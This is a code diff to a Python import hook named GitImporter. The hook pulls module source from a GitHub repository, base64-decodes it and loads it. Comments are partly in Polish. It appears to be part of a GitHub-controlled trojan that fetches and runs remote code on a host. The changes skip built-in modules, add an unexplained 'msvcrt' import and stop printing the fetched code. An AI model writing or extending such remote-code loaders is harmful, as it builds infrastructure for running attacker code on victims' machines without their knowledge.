@@ -3,6 +3,8 @@ import base64
 import importlib.util
 import sys
 import traceback
+import msvcrt
+
 
 from modules.gitconnect import github_connect, get_file_contents
 
@@ -24,16 +26,20 @@ class GitImporter:
         """
         print(f"[*] Attempting to fetch module: {name}")
         try:
+            # Sprawdź, czy moduł jest w standardowej bibliotece
+            if name in sys.builtin_module_names or importlib.util.find_spec(name):
+                print(f"[INFO] Skipping built-in or locally available module: {name}")
+                return None
+
             new_library = get_file_contents('modules', f'{name}.py', self.repo)
             if new_library is not None:
                 self.current_module_code = base64.b64decode(new_library).decode('utf-8')
-                print(f"[INFO] Module {name} fetched successfully. Code: {self.current_module_code[:100]}...")
+                print(f"[INFO] Module {name} fetched successfully.")
                 return self
         except Exception as e:
             print(f"[ERROR] Failed to fetch module {name}: {e}")
             traceback.print_exc()
         return None
-
 
 
     def load_module(self, name):
